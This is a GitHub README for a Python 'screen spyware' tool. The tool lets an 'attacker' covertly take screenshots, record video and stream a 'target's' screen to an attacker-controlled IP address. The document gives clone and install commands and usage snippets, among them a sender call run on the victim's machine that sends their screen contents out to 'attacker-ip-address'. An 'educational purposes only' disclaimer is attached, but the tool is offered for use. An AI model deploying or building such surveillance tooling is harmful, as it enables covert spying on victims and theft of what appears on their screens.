# Screen Spyware

![image](https://drive.google.com/uc?export=download&id=1F5VVhcpT-Q0UKURoEs98ywISs9RPEzzF)

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker to spy on a target through the screen

## Features

- You can screenshot the screen of the target
- You can screen video the screen of the target
- It streams the target's screen view to the attacker

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/screen-spyware.git && cd screen-spyware
```

```shell
pip install requirements.txt
```

## Usage

Instantiating the class

```python
attacker, target = "attacker-name", "target-name"
screenSpy = ScreenIntel(attacker, target)
```

To take screen shot of the target's system

```python
image, stat = screenSpy.screenShotter()
```

To take a screen video of the target's system

```python
secs = 30
videoFile = screenSpy.screenVideo(secs)
```

To stream the screen view from the target to the attacker
On target's system

```python
host = "attacker-ip-address"
stream = screenSpy().screenSender(host)
```

On attacker's system

```python
host = "attacker-ip-address"
stream = screenSpy().screenReceiver(host)
```

## Run

```shell
python screen.py
```

To use the streaming function, first run the software on attacker's system before running on the target's system
